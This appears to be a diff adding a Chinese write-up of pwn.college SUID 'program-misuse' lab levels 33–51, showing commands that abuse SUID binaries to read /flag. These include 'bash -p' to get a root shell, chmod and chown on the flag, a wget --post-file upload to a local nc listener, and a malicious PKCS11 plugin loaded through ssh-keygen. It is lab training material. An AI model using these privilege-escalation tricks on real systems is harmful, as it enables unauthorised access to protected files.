@@ -824,157 +824,480 @@ hacker@program-misuse-level-32:~$ socat -u "file:/flag" -
 pwn.college{QKHthQcoA6ncJKsiqFJMZ6ITybE.0FN3EDL2QjMyMzW}
 hacker@program-misuse-level-32:~$
 ```
-
-
 ## level33 Requires some light programming to read the flag.!
-
-
 ```
+hacker@program-misuse-level-33:~$ sh file.sh
+Welcome to ./babysuid_level33!
 
+This challenge is part of a series of programs that
+will require some light programming to read the flag..
+
+I just set the SUID bit on /usr/bin/whiptail.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level33) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/whiptail!
 ```
-
+`whiptail`：展示shell的对话框的工具
+```
+hacker@program-misuse-level-33:~$ whiptail --textbox /flag 20 40
+pwn.college{4r_plp-YJyPyhT4_GiJQz042S5b.0VN3EDL2QjMyMzW}
+```
+是一个打开对话框的工具，因此思路就是直接展示出来就行了。
 
 ## level34 Requires some light programming to read the flag.!
-
-
 ```
+hacker@program-misuse-level-34:~$ sh file.sh
+Welcome to ./babysuid_level34!
 
+This challenge is part of a series of programs that
+will require some light programming to read the flag..
+
+I just set the SUID bit on /usr/bin/awk.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level34) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/awk!
 ```
-
+这次是一个我一直都不怎么会用的工具了。。。你妈的
+```
+hacker@program-misuse-level-34:~$ awk '{print $1}' /flag
+pwn.college{ghdjRlnfhKYn-uhIb2N76siNtG_.0lN3EDL2QjMyMzW}
+hacker@program-misuse-level-34:~$
+```
+`awk`是一个很有用的工具，有时间还是得学一学
 
 ## level35 Requires some light programming to read the flag.!
-
-
 ```
+hacker@program-misuse-level-35:~$ sh file.sh
+Welcome to ./babysuid_level35!
 
+This challenge is part of a series of programs that
+will require some light programming to read the flag..
+
+I just set the SUID bit on /usr/bin/sed.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level35) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/sed!
 ```
-
+果然，在awk之后我就应该想到是sed
+```
+hacker@program-misuse-level-35:~$ sed p /flag
+pwn.college{M3upZ8DYRun26uvObOYrzPSdSUO.01N3EDL2QjMyMzW}
+pwn.college{M3upZ8DYRun26uvObOYrzPSdSUO.01N3EDL2QjMyMzW}
+hacker@program-misuse-level-35:~$
+```
+也许我之前操作错了什么，这里不应该是两行flag吧？
 
 ## level36 Requires some light programming to read the flag.!
-
-
 ```
+hacker@program-misuse-level-36:~$ sh file.sh
+Welcome to ./babysuid_level36!
 
+This challenge is part of a series of programs that
+will require some light programming to read the flag..
+
+I just set the SUID bit on /usr/bin/ed.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level36) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/ed!
 ```
-
+`ed`工具：是个编辑器，是交互式的
+```
+hacker@program-misuse-level-36:~$ ed /flag
+57
+.p
+pwn.college{QNXzpWhqr3e12Okfu2KRnY5jyxa.0FO3EDL2QjMyMzW}
+```
+显示全文
 
 ## level37 Lets you get the flag by doing tricks with permissions!
-
-
 ```
+hacker@program-misuse-level-37:~$ sh file.sh
+Welcome to ./babysuid_level37!
 
+This challenge is part of a series of programs that
+let you get the flag by doing tricks with permissions.
+
+I just set the SUID bit on /usr/bin/chown.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level37) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/chown!
 ```
-
+`chown`工具：改变文件的所有者和组的
+```
+hacker@program-misuse-level-37:~$ chown hacker /flag
+hacker@program-misuse-level-37:~$ cat /flag
+pwn.college{49NDHOhwhBEwWccuPUHSxUU0RIE.0VO3EDL2QjMyMzW}
+hacker@program-misuse-level-37:~$
+```
+这就是简单的赋权了
 
 ## level38 Lets you get the flag by doing tricks with permissions!
-
-
 ```
+hacker@program-misuse-level-38:~$ sh file.sh
+Welcome to ./babysuid_level38!
 
+This challenge is part of a series of programs that
+let you get the flag by doing tricks with permissions.
+
+I just set the SUID bit on /usr/bin/chmod.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level38) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/chmod!
 ```
-
+这个，没人不会吧
+```
+hacker@program-misuse-level-38:~$ chmod 777 /flag
+hacker@program-misuse-level-38:~$ cat /flag
+pwn.college{UtH5piA32tLwQLpCFPRDXuFa98r.0FM4EDL2QjMyMzW}
+hacker@program-misuse-level-38:~$
+```
 
 ## level39 Lets you get the flag by doing tricks with permissions!
-
-
 ```
+hacker@program-misuse-level-39:~$ sh file.sh
+Welcome to ./babysuid_level39!
 
+This challenge is part of a series of programs that
+let you get the flag by doing tricks with permissions.
+
+I just set the SUID bit on /usr/bin/cp.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level39) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/cp!
 ```
-
+一开始想搞个硬链接，然后发现不行，然后输出到[标准输出流](https://blog.csdn.net/Dontla/article/details/121200247)就行了
+```
+hacker@program-misuse-level-39:~$ cp /flag /dev/stdout
+pwn.college{Q2azoEz2fXYLZxYkmGAK4PjtrO7.0VM4EDL2QjMyMzW}
+hacker@program-misuse-level-39:~$
+```
 
 ## level40 Lets you get the flag by doing tricks with permissions!
-
-
 ```
+hacker@program-misuse-level-40:~$ sh file.sh
+Welcome to ./babysuid_level40!
 
+This challenge is part of a series of programs that
+let you get the flag by doing tricks with permissions.
+
+I just set the SUID bit on /usr/bin/mv.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level40) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/mv!
 ```
+这题，十分的离谱啊，完全不会做，看的答案，实在是太骚气了，使用mv把cat覆盖mv
+```
+hacker@program-misuse-level-40:~$ mv /usr/bin/cat /usr/bin/mv
+hacker@program-misuse-level-40:~$ sh file.sh
+Welcome to ./babysuid_level40!
 
+This challenge is part of a series of programs that
+let you get the flag by doing tricks with permissions.
 
+I just set the SUID bit on /usr/bin/mv.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level40) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/mv!
+hacker@program-misuse-level-40:~$ mv /flag
+pwn.college{g9AYY8a5E2v4R8jr_434HNFYEL3.0lM4EDL2QjMyMzW}
+hacker@program-misuse-level-40:~$
+```
+///@TODO:这个值得记录一下！
+
+这个题让我想起了一个看到的内容：
+>如果我们在命令之中不使用管道而使用重定向（这是新手可能会犯的错误）那么前一个输出会重写到后面的命令之中造成混乱，比如 cat /flag > more
 ## level41 Lets you read the flag because they let you program anything!
-
-
 ```
+hacker@program-misuse-level-41:~$ sh file.sh
+Welcome to ./babysuid_level41!
 
+This challenge is part of a series of programs that
+let you read the flag because they let you program anything.
+
+I just set the SUID bit on /usr/bin/perl.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level41) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/perl!
 ```
-
+`perl`是个脚本解释器，
+```
+hacker@program-misuse-level-41:~$ perl -ne "print if pwn.college" /flag
+perl: warning: Setting locale failed.
+perl: warning: Please check that your locale settings:
+        LANGUAGE = (unset),
+        LC_ALL = (unset),
+        LC_CTYPE = "C.UTF-8",
+        LANG = "en_US.UTF-8"
+    are supported and installed on your system.
+perl: warning: Falling back to the standard locale ("C").
+pwn.college{s8g_u7MkHNRfph-Yrrslj2vzKUJ.01M4EDL2QjMyMzW}
+hacker@program-misuse-level-41:~$
+```
+打印有pen.college的行
 
 ## level42 Lets you read the flag because they let you program anything!
-
-
 ```
+hacker@program-misuse-level-42:~$ sh file.sh
+Welcome to ./babysuid_level42!
 
+This challenge is part of a series of programs that
+let you read the flag because they let you program anything.
+
+I just set the SUID bit on /usr/bin/python.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level42) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/python!
 ```
+使用python
+```
+>>> with open("/flag","r") as f:
+...     print(f.read())
+...
+pwn.college{kTtv9lYtW7yK8dnUSvApk5Yv1s-.0FN4EDL2QjMyMzW}
 
-
+>>>
+```
 ## level43 Lets you read the flag because they let you program anything!
-
-
 ```
+hacker@program-misuse-level-43:~$ sh file.sh
+Welcome to ./babysuid_level43!
 
+This challenge is part of a series of programs that
+let you read the flag because they let you program anything.
+
+I just set the SUID bit on /usr/bin/ruby.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level43) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/ruby!
 ```
-
+用ruby写脚本
+```
+# 打开文件
+File.open('/flag', 'r') do |f|
+  # 读取文件内容
+  content = f.read
+  # 输出文件内容
+  puts content
+end
+```
+```
+hacker@program-misuse-level-43:~$ ruby level43.rb
+pwn.college{smGb0PfTvxp0__6HgKHsucNW2Pg.0VN4EDL2QjMyMzW}
+hacker@program-misuse-level-43:~$
+```
 
 ## level44 Lets you read the flag because they let you program anything!
-
-
 ```
+hacker@program-misuse-level-44:~$ sh file.sh
+Welcome to ./babysuid_level44!
 
+This challenge is part of a series of programs that
+let you read the flag because they let you program anything.
+
+I just set the SUID bit on /usr/bin/bash.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level44) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/bash!
 ```
-
+bash，参照之前的题拿到提示符
+```
+hacker@program-misuse-level-44:~$ bash -p
+bash-5.0# cat /flag
+pwn.college{wsQ6idwZWBnJ7doJInQhvY0hBVg.0lN4EDL2QjMyMzW}
+bash-5.0#
+```
 
 ## level45 Just straight up wasn't designed to let you read files!
-
-
 ```
+hacker@program-misuse-level-45:~$ sh file.sh
+Welcome to ./babysuid_level45!
 
+This challenge is part of a series of programs that
+just straight up weren't designed to let you read files.
+
+I just set the SUID bit on /usr/bin/date.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level45) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/date!
 ```
-
+手册里写了-f读文件
+```
+hacker@program-misuse-level-45:~$ date -f /flag
+date: invalid date 'pwn.college{E0wTS_9vWAv5Z6QWVWGpaHKER5P.01N4EDL2QjMyMzW}'
+hacker@program-misuse-level-45:~$
+```
 
 ## level46 Just straight up wasn't designed to let you read files!
-
-
 ```
+hacker@program-misuse-level-46:~$ sh file.sh
+Welcome to ./babysuid_level46!
 
+This challenge is part of a series of programs that
+just straight up weren't designed to let you read files.
+
+I just set the SUID bit on /usr/bin/dmesg.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level46) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/dmesg!
 ```
-
+显示开机时间之类的东西
+```
+hacker@program-misuse-level-46:~$ dmesg -F /flag
+[    0.000000] pwn.college{Q8U4rT5_srr0BlLq1ZlDOJx0yDe.0FO4EDL2QjMyMzW}
+hacker@program-misuse-level-46:~$
+```
+都是看手册
 
 ## level47 Just straight up wasn't designed to let you read files!
-
-
 ```
+hacker@program-misuse-level-47:~$ sh file.sh
+Welcome to ./babysuid_level47!
 
+This challenge is part of a series of programs that
+just straight up weren't designed to let you read files.
+
+I just set the SUID bit on /usr/bin/wc.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level47) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/wc!
 ```
-
+`wc`一般用于统计行号、字数什么的。
+```
+hacker@program-misuse-level-47:~$ wc --files0-from=/flag
+wc: 'pwn.college{shy1dFSZ2LmpPnQ-OAl_RoDeLxh.0VO4EDL2QjMyMzW}'$'\n': No such file or directory
+hacker@program-misuse-level-47:~$
+```
+从手册来看就上面这个不是统计数量的，因此就它了！
 
 ## level48 Just straight up wasn't designed to let you read files!
-
-
 ```
+hacker@program-misuse-level-48:~$ sh file.sh
+Welcome to ./babysuid_level48!
 
+This challenge is part of a series of programs that
+just straight up weren't designed to let you read files.
+
+I just set the SUID bit on /usr/bin/gcc.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level48) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/gcc!
 ```
-
+有点儿意思，gcc都出来了
+```
+hacker@program-misuse-level-48:~$ gcc -x c -E /flag
+# 1 "/flag"
+# 1 "<built-in>"
+# 1 "<command-line>"
+# 31 "<command-line>"
+# 1 "/usr/include/stdc-predef.h" 1 3 4
+# 32 "<command-line>" 2
+# 1 "/flag"
+pwn.college{UgtHTJRU8raItcJF89PS-hM7Rh9.0FM5EDL2QjMyMzW}
+hacker@program-misuse-level-48:~$
+```
+它这个必须要指定语言，不然不能运行
 
 ## level49 Just straight up wasn't designed to let you read files!
-
-
 ```
+hacker@program-misuse-level-49:~$ sh file.sh
+Welcome to ./babysuid_level49!
 
+This challenge is part of a series of programs that
+just straight up weren't designed to let you read files.
+
+I just set the SUID bit on /usr/bin/as.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level49) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/as!
 ```
-
+`as`:汇编语言的编译器
+```
+hacker@program-misuse-level-49:~$ as -g /flag
+/flag: Assembler messages:
+/flag:1: Error: no such instruction: `pwn.college{MqHCh7Oprd3rEP2f1i_RgAl8QZR.0VM5EDL2QjMyMzW}'
+hacker@program-misuse-level-49:~$
+```
+通过调试输出
 
 ## level50 Just straight up wasn't designed to let you read files!
+```
+hacker@program-misuse-level-50:~$ sh file.sh
+Welcome to ./babysuid_level50!
 
+This challenge is part of a series of programs that
+just straight up weren't designed to let you read files.
+
+I just set the SUID bit on /usr/bin/wget.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level50) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/wget!
+```
+`wget`:下载器
+```
+hacker@program-misuse-level-50:~$ nc -lp 8888 & wget --post-file=/flag http://127.0.0.1:8888
+[1] 5873
+--2023-07-22 13:39:17--  http://127.0.0.1:8888/
+Connecting to 127.0.0.1:8888... connected.
+POST / HTTP/1.1
+User-Agent: Wget/1.20.3 (linux-gnu)
+Accept: */*
+Accept-Encoding: identity
+Host: 127.0.0.1:8888
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 57
+
+HTTP request sent, awaiting response... pwn.college{M8oJZxXsT1hCl5_WCWqpA-ITlJZ.0lM5EDL2QjMyMzW}
 
 ```
-
-```
-
+有个叫文件上传的功能，这个看了一个别人的答案
 
 ## level51 Shows how dangerous it is to allow users to load their own code as plugins into the program (but figuring out how is the hard part)!
 ```
+hacker@program-misuse-level-51:~$ sh file.sh
+Welcome to ./babysuid_level51!
 
-```
+This challenge is part of a series of programs that
+show you how dangerous it is to allow users to load their own code as plugins into the program (but figuring out how is the hard part!).
 
-```
+I just set the SUID bit on /usr/bin/ssh-keygen.
+Try to use it to read the flag!
 
+IMPORTANT: make sure to run me (./babysuid_level51) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/ssh-keygen!
 ```
+这个我是一点儿都不会，看了一下讲解才明白，G
+
+这个就是写一个C/C++程序，里面要有C_GetFunctionList这个函数，然后用sendfile来open文件。
+
+然后使用gcc编译成.so文件，最后使用ssh-keygen -D即可。
+```
+hacker@program-misuse-level-51:~$ ssh-keygen -D ./level51.so
+pwn.college{koI1pFWalnNHyjlN_NQ4CLcsasT.01M5EDL2QjMyMzW}
+C_GetFunctionList for provider ./level51.so failed: 57
+cannot read public key from pkcs11
+hacker@program-misuse-level-51:~$
+```
+## 值得记录的内容
+关于mv 那块儿的，[一个博客]（https://medium.com/workindia-in/the-dark-side-of-mv-command-3419c1bd619）
+
+最后一个题的[讲解](https://www.youtube.com/watch?v=14mIjpOXnrM&t=2878s),这玩意儿不讲是真不会，太菜了
